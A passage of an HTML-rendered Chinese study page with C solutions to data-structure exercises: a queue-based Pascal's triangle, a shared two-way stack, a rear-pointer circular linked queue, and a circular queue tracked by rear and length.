class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100 <span class="hljs-comment">// 队列的最大容量，用于存储杨辉三角的元素</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">int</span> data[MAX_SIZE]; <span class="hljs-comment">// 队列数组</span><br>    <span class="hljs-type">int</span> front;          <span class="hljs-comment">// 队头指针</span><br>    <span class="hljs-type">int</span> rear;           <span class="hljs-comment">// 队尾指针</span><br>&#125; Queue;<br><br><span class="hljs-comment">// 初始化队列</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InitQueue</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    q-&gt;front = <span class="hljs-number">0</span>;<br>    q-&gt;rear = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 判断队列是否为空</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> q-&gt;front == q-&gt;rear;<br>&#125;<br><br><span class="hljs-comment">// 判断队列是否已满</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsFull</span><span class="hljs-params">(Queue *q)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (q-&gt;rear + <span class="hljs-number">1</span>) % MAX_SIZE == q-&gt;front;<br>&#125;<br><br><span class="hljs-comment">// 入队操作</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Enqueue</span><span class="hljs-params">(Queue *q, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsFull</span>(q)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 队列已满，入队失败</span><br>    &#125;<br>    q-&gt;data[q-&gt;rear] = value;<br>    q-&gt;rear = (q-&gt;rear + <span class="hljs-number">1</span>) % MAX_SIZE;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 出队操作</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dequeue</span><span class="hljs-params">(Queue *q, <span class="hljs-type">int</span> *value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(q)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 队列为空，出队失败</span><br>    &#125;<br>    *value = q-&gt;data[q-&gt;front];<br>    q-&gt;front = (q-&gt;front + <span class="hljs-number">1</span>) % MAX_SIZE;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 生成并打印杨辉三角</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintYangHuiTriangle</span><span class="hljs-params">(<span class="hljs-type">int</span> rows)</span> </span>&#123;<br>    Queue q;<br>    <span class="hljs-built_in">InitQueue</span>(&amp;q);<br><br>    <span class="hljs-built_in">Enqueue</span>(&amp;q, <span class="hljs-number">1</span>); <span class="hljs-comment">// 初始化第一行</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= rows; i++) &#123;<br>        <span class="hljs-type">int</span> prev = <span class="hljs-number">0</span>, current;<br><br>        <span class="hljs-comment">// 打印并生成当前行</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++) &#123;<br>            <span class="hljs-built_in">Dequeue</span>(&amp;q, &amp;current); <span class="hljs-comment">// 取出当前元素</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, current);<br>            <span class="hljs-built_in">Enqueue</span>(&amp;q, prev + current); <span class="hljs-comment">// 将前一个元素和当前元素之和入队</span><br>            prev = current; <span class="hljs-comment">// 更新 prev 为当前元素</span><br>        &#125;<br>        <span class="hljs-built_in">Enqueue</span>(&amp;q, <span class="hljs-number">1</span>); <span class="hljs-comment">// 每行末尾加入 1</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> rows;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入杨辉三角的行数: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;rows);<br><br>    <span class="hljs-built_in">PrintYangHuiTriangle</span>(rows);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>设有两个栈 sl、s2都采用顺序栈方式，并且共享一个存储区[0.MAXSIZE-1]，为了尽量利用空间，减少溢出的可能，可采用栈顶相向、迎面增长的存储方式，试设计入栈、出栈的算法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100 <span class="hljs-comment">// 共享存储区的最大容量</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">int</span> data[MAXSIZE]; <span class="hljs-comment">// 存储区</span><br>    <span class="hljs-type">int</span> top1;          <span class="hljs-comment">// 栈s1的栈顶指针</span><br>    <span class="hljs-type">int</span> top2;          <span class="hljs-comment">// 栈s2的栈顶指针</span><br>&#125; SharedStack;<br><br><span class="hljs-comment">// 初始化共享栈</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InitStack</span><span class="hljs-params">(SharedStack *stack)</span> </span>&#123;<br>    stack-&gt;top1 = <span class="hljs-number">-1</span>;        <span class="hljs-comment">// s1的栈顶指针初始化为-1</span><br>    stack-&gt;top2 = MAXSIZE;   <span class="hljs-comment">// s2的栈顶指针初始化为MAXSIZE</span><br>&#125;<br><br><span class="hljs-comment">// 入栈操作，flag=1表示s1，flag=2表示s2</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Push</span><span class="hljs-params">(SharedStack *stack, <span class="hljs-type">int</span> value, <span class="hljs-type">int</span> flag)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (stack-&gt;top1 + <span class="hljs-number">1</span> == stack-&gt;top2) &#123; <span class="hljs-comment">// 判断是否栈满</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈满，无法入栈\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (flag == <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// s1入栈</span><br>        stack-&gt;data[++stack-&gt;top1] = value;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (flag == <span class="hljs-number">2</span>) &#123; <span class="hljs-comment">// s2入栈</span><br>        stack-&gt;data[--stack-&gt;top2] = value;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;无效的栈标识\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 出栈操作，flag=1表示s1，flag=2表示s2</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Pop</span><span class="hljs-params">(SharedStack *stack, <span class="hljs-type">int</span> *value, <span class="hljs-type">int</span> flag)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (flag == <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// s1出栈</span><br>        <span class="hljs-keyword">if</span> (stack-&gt;top1 == <span class="hljs-number">-1</span>) &#123; <span class="hljs-comment">// 判断s1是否为空</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈s1空，无法出栈\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        *value = stack-&gt;data[stack-&gt;top1--];<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (flag == <span class="hljs-number">2</span>) &#123; <span class="hljs-comment">// s2出栈</span><br>        <span class="hljs-keyword">if</span> (stack-&gt;top2 == MAXSIZE) &#123; <span class="hljs-comment">// 判断s2是否为空</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈s2空，无法出栈\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        *value = stack-&gt;data[stack-&gt;top2++];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;无效的栈标识\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    SharedStack stack;<br>    <span class="hljs-built_in">InitStack</span>(&amp;stack);<br><br>    <span class="hljs-comment">// 测试s1的入栈</span><br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">20</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">30</span>, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// 测试s2的入栈</span><br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">100</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">200</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">300</span>, <span class="hljs-number">2</span>);<br><br>    <span class="hljs-comment">// 测试s1的出栈</span><br>    <span class="hljs-type">int</span> value;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈s1出栈元素: &quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Pop</span>(&amp;stack, &amp;value, <span class="hljs-number">1</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, value);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-comment">// 测试s2的出栈</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈s2出栈元素: &quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Pop</span>(&amp;stack, &amp;value, <span class="hljs-number">2</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, value);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>假设用一个循环单链表来表示循环队列，该队列只设一个队尾指针，不设队头指针编写如下函数:<br>(1)向循环链队中插入一个元素为x的结点。<br>(2)从循环链队中删除一个结点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">// 定义节点结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *next;<br>&#125; Node;<br><br><span class="hljs-comment">// 定义循环链队列，仅包含队尾指针</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    Node *rear;  <span class="hljs-comment">// 队尾指针</span><br>&#125; CircularQueue;<br><br><span class="hljs-comment">// 初始化循环队列</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InitQueue</span><span class="hljs-params">(CircularQueue *queue)</span> </span>&#123;<br>    queue-&gt;rear = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 队尾指针初始化为空</span><br>&#125;<br><br><span class="hljs-comment">// 插入元素x（入队）或删除元素（出队）</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QueueOperation</span><span class="hljs-params">(CircularQueue *queue, <span class="hljs-type">int</span> *value, <span class="hljs-type">int</span> isEnqueue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (isEnqueue) &#123;  <span class="hljs-comment">// 入队操作</span><br>        Node *newNode = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node));<br>        <span class="hljs-keyword">if</span> (!newNode) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        newNode-&gt;data = *value;<br><br>        <span class="hljs-keyword">if</span> (!queue-&gt;rear) &#123;  <span class="hljs-comment">// 队列为空</span><br>            newNode-&gt;next = newNode;  <span class="hljs-comment">// 自环</span><br>            queue-&gt;rear = newNode;    <span class="hljs-comment">// 队尾指向新节点</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// 队列不为空</span><br>            newNode-&gt;next = queue-&gt;rear-&gt;next;  <span class="hljs-comment">// 新节点的next指向队头</span><br>            queue-&gt;rear-&gt;next = newNode;        <span class="hljs-comment">// 队尾的next指向新节点</span><br>            queue-&gt;rear = newNode;              <span class="hljs-comment">// 更新队尾指针</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// 入队成功</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// 出队操作</span><br>        <span class="hljs-keyword">if</span> (!queue-&gt;rear) &#123;  <span class="hljs-comment">// 队列为空</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列为空，无法出队\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <br>        Node *temp = queue-&gt;rear-&gt;next;  <span class="hljs-comment">// 队头节点</span><br>        *value = temp-&gt;data;             <span class="hljs-comment">// 获取队头元素</span><br>        <br>        <span class="hljs-keyword">if</span> (queue-&gt;rear == temp) &#123;  <span class="hljs-comment">// 队列仅有一个节点</span><br>            queue-&gt;rear = <span class="hljs-literal">NULL</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// 队列有多个节点</span><br>            queue-&gt;rear-&gt;next = temp-&gt;next;  <span class="hljs-comment">// 队尾的next指向新的队头</span><br>        &#125;<br>        <span class="hljs-built_in">free</span>(temp);  <span class="hljs-comment">// 释放旧的队头节点</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-comment">// 出队成功</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    CircularQueue queue;<br>    <span class="hljs-built_in">InitQueue</span>(&amp;queue);<br><br>    <span class="hljs-comment">// 入队操作</span><br>    <span class="hljs-type">int</span> value = <span class="hljs-number">10</span>;<br>    <span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">1</span>);<br>    value = <span class="hljs-number">20</span>;<br>    <span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">1</span>);<br>    value = <span class="hljs-number">30</span>;<br>    <span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// 出队操作</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队元素: %d\n&quot;</span>, value);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队元素: %d\n&quot;</span>, value);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队元素: %d\n&quot;</span>, value);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列为空，无法出队\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>假设将循环队列定义为:以域变量rear 和 length 分别表示循环队列中队尾元素的位和内含元素的个数。试给出循环队列的队满条件，并写出相应的入队和出队的算法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100 <span class="hljs-comment">// 队列的最大容量</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">int</span> data[MAXSIZE];  <span class="hljs-comment">// 存储队列元素的数组</span><br>    <span class="hljs-type">int</span> rear;           <span class="hljs-comment">// 队尾指针</span><br>    <span class="hljs-type">int</span> length;         <span class="hljs-comment">// 队列中元素的个数</span><br>&#125; CircularQueue;<br><br><span class="hljs-comment">// 初始化循环队列</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InitQueue</span><span class="hljs-params">(CircularQueue *queue)</span> </span>&#123;<br>    queue-&gt;rear = <span class="hljs-number">-1</span>;      <span class="hljs-comment">// 初始时，队尾指针为 -1 表示空队列</span><br>    queue-&gt;length = <span class="hljs-number">0</span>;     <span class="hljs-comment">// 初始时，队列中没有元素</span><br>&#125;<br><br><span class="hljs-comment">// 队列操作：入队（isEnqueue为1）和出队（isEnqueue为0）</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QueueOperation</span><span class="hljs-params">(CircularQueue *queue, <span class="hljs-type">int</span> *value, <span class="hljs-type">int</span> isEnqueue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (isEnqueue) &#123; <span class="hljs-comment">// 入队操作</span><br>        <span class="hljs-keyword">if</span> (queue-&gt;length == MAXSIZE) &#123; <span class="hljs-comment">// 队满条件</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列已满，无法入队\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        queue-&gt;rear = (queue-&gt;rear + <span class="hljs-number">1</span>) % MAXSIZE; <span class="hljs-comment">// 更新队尾位置</span><br>        queue-&gt;data[queue-&gt;rear] = *value;         <span class="hljs-comment">// 在队尾插入新元素</span><br>        queue-&gt;length++;                           <span class="hljs-comment">// 增加队列长度</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 出队操作</span><br>        <span class="hljs-keyword">if</span> (queue-&gt;length == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 队空条件</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列为空，无法出队\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> front = (queue-&gt;rear - queue-&gt;length + <span class="hljs-number">1</span> + MAXSIZE) % MAXSIZE; <span class="hljs-comment">// 计算队头位置</span><br>        *value = queue-&gt;data[front];   <span class="hljs-comment">// 获取队头元素</span><br>        queue-&gt;length--;               <span class="hljs-comment">// 减少队列长度</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    CircularQueue queue;<br>    <span class="hljs-built_in">InitQueue</span>(&amp;queue);<br><br>    <span class="hljs-comment">// 入队操作</span><br>    <span class="hljs-type">int</span> value = <span class="hljs-number">10</span>;<br>    <span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">1</span>);<br>    value = <span class="hljs-number">20</span>;<br>    <span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">1</span>);<br>    value = <span class="hljs-number">30</span>;<br>    <span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// 出队操作</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队元素: %d\n&quot;</span>, value);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队元素: %d\n&quot;</span>, value);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队元素: %d\n&quot;</span>, value);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列为空，无法出队\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 